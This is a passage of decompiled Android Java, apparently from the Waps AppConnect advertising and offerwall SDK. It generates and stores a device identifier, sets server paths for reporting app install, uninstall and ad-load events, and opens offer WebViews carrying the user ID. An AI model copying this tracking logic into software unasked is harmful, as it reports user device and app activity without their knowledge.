        //   531: invokevirtual append : (C)Ljava/lang/StringBuffer;
        //   534: pop
        //   535: iload_1
        //   536: iconst_1
        //   537: iadd
        //   538: istore_1
        //   539: goto -> 507
        //   542: aload_0
        //   543: aload_3
        //   544: invokevirtual toString : ()Ljava/lang/String;
        //   547: invokevirtual toLowerCase : ()Ljava/lang/String;
        //   550: putfield x : Ljava/lang/String;
        //   553: aload_2
        //   554: invokeinterface edit : ()Landroid/content/SharedPreferences$Editor;
        //   559: astore_3
        //   560: aload_3
        //   561: ldc_w 'emulatorDeviceId'
        //   564: aload_0
        //   565: getfield x : Ljava/lang/String;
        //   568: invokeinterface putString : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
        //   573: pop
        //   574: aload_3
        //   575: invokeinterface commit : ()Z
        //   580: pop
        //   581: goto -> 288
        //   584: astore_2
        //   585: return
        //   586: aload_0
        //   587: aconst_null
        //   588: putfield x : Ljava/lang/String;
        //   591: goto -> 288
        //   594: astore_3
        //   595: goto -> 334
        //   598: return
        //   599: astore_3
        //   600: goto -> 288
        //   603: iconst_0
        //   604: istore_1
        //   605: goto -> 507
        // Exception table:
        //   from	to	target	type
        //   9	26	584	android/content/pm/PackageManager$NameNotFoundException
        //   31	51	584	android/content/pm/PackageManager$NameNotFoundException
        //   57	66	584	android/content/pm/PackageManager$NameNotFoundException
        //   66	78	584	android/content/pm/PackageManager$NameNotFoundException
        //   82	122	584	android/content/pm/PackageManager$NameNotFoundException
        //   126	140	584	android/content/pm/PackageManager$NameNotFoundException
        //   140	152	584	android/content/pm/PackageManager$NameNotFoundException
        //   156	161	584	android/content/pm/PackageManager$NameNotFoundException
        //   165	179	584	android/content/pm/PackageManager$NameNotFoundException
        //   179	270	584	android/content/pm/PackageManager$NameNotFoundException
        //   274	288	584	android/content/pm/PackageManager$NameNotFoundException
        //   288	334	594	java/lang/Exception
        //   288	334	584	android/content/pm/PackageManager$NameNotFoundException
        //   334	359	584	android/content/pm/PackageManager$NameNotFoundException
        //   363	377	584	android/content/pm/PackageManager$NameNotFoundException
        //   378	392	584	android/content/pm/PackageManager$NameNotFoundException
        //   396	421	584	android/content/pm/PackageManager$NameNotFoundException
        //   421	428	584	android/content/pm/PackageManager$NameNotFoundException
        //   428	483	599	java/lang/NumberFormatException
        //   428	483	584	android/content/pm/PackageManager$NameNotFoundException
        //   488	504	599	java/lang/NumberFormatException
        //   488	504	584	android/content/pm/PackageManager$NameNotFoundException
        //   513	535	599	java/lang/NumberFormatException
        //   513	535	584	android/content/pm/PackageManager$NameNotFoundException
        //   542	581	599	java/lang/NumberFormatException
        //   542	581	584	android/content/pm/PackageManager$NameNotFoundException
        //   586	591	584	android/content/pm/PackageManager$NameNotFoundException
    }

    public void package_receiver(String paramString, int paramInt) {
        // Byte code:
        //   0: iload_2
        //   1: tableswitch default -> 32, 0 -> 60, 1 -> 73, 2 -> 87, 3 -> 101
        //   32: ldc 'receiver/install?'
        //   34: putstatic com/waps/AppConnect.ab : Ljava/lang/String;
        //   37: ldc 'install'
        //   39: putstatic com/waps/AppConnect.ac : Ljava/lang/String;
        //   42: aload_0
        //   43: aload_1
        //   44: putfield N : Ljava/lang/String;
        //   47: getstatic com/waps/AppConnect.u : Lcom/waps/AppConnect;
        //   50: ifnull -> 59
        //   53: getstatic com/waps/AppConnect.u : Lcom/waps/AppConnect;
        //   56: invokespecial packageReceiverHelper : ()V
        //   59: return
        //   60: ldc 'receiver/install?'
        //   62: putstatic com/waps/AppConnect.ab : Ljava/lang/String;
        //   65: ldc 'install'
        //   67: putstatic com/waps/AppConnect.ac : Ljava/lang/String;
        //   70: goto -> 42
        //   73: ldc_w 'receiver/load_offer?'
        //   76: putstatic com/waps/AppConnect.ab : Ljava/lang/String;
        //   79: ldc 'load'
        //   81: putstatic com/waps/AppConnect.ac : Ljava/lang/String;
        //   84: goto -> 42
        //   87: ldc_w 'receiver/load_ad?'
        //   90: putstatic com/waps/AppConnect.ab : Ljava/lang/String;
        //   93: ldc 'load'
        //   95: putstatic com/waps/AppConnect.ac : Ljava/lang/String;
        //   98: goto -> 42
        //   101: ldc_w 'receiver/uninstall?'
        //   104: putstatic com/waps/AppConnect.ab : Ljava/lang/String;
        //   107: ldc 'uninstall'
        //   109: putstatic com/waps/AppConnect.ab : Ljava/lang/String;
        //   112: goto -> 42
    }

    public void showMore(Context paramContext) {
        showMore(paramContext, this.x);
    }

    public void showMore(Context paramContext, String paramString) {
        Intent intent = new Intent(paramContext, OffersWebView.class);
        intent.putExtra("Offers_URL", this.J);
        intent.putExtra("USER_ID", paramString);
        intent.putExtra("URL_PARAMS", this.L);
        intent.putExtra("CLIENT_PACKAGE", this.K);
        paramContext.startActivity(intent);
    }

    public Intent showMore_forTab(Context paramContext) {
        return showMore_forTab(paramContext, this.x);
    }

    public Intent showMore_forTab(Context paramContext, String paramString) {
        Intent intent = new Intent(paramContext, OffersWebView.class);
        intent.putExtra("Offers_URL", this.J);
        intent.putExtra("USER_ID", paramString);
        intent.putExtra("URL_PARAMS", this.L);
        intent.putExtra("CLIENT_PACKAGE", this.K);
        return intent;
    }

    public void showOffers(Context paramContext) {
        showOffers(paramContext, this.x);
    }

    public void showOffers(Context paramContext, String paramString) {
        Intent intent = new Intent(paramContext, OffersWebView.class);
        intent.putExtra("Offers_URL", this.I);
        intent.putExtra("USER_ID", paramString);
        intent.putExtra("URL_PARAMS", this.L);
        intent.putExtra("CLIENT_PACKAGE", this.K);
        paramContext.startActivity(intent);
    }

    public Intent showOffers_forTab(Context paramContext) {
        return showOffers_forTab(paramContext, this.x);
    }

    public Intent showOffers_forTab(Context paramContext, String paramString) {
        Intent intent = new Intent(paramContext, OffersWebView.class);
        intent.putExtra("Offers_URL", this.I);
        intent.putExtra("USER_ID", paramString);
        intent.putExtra("URL_PARAMS", this.L);
        intent.putExtra("CLIENT_PACKAGE", this.K);
        return intent;
    }

    public void spendPoints(int paramInt, UpdatePointsNotifier paramUpdatePointsNotifier) {
        if (paramInt >= 0) {
            this.H = "" + paramInt;
            if (u != null) {
                V = paramUpdatePointsNotifier;
                u.spendPointsHelper();
                return;
            }
        }
    }
}

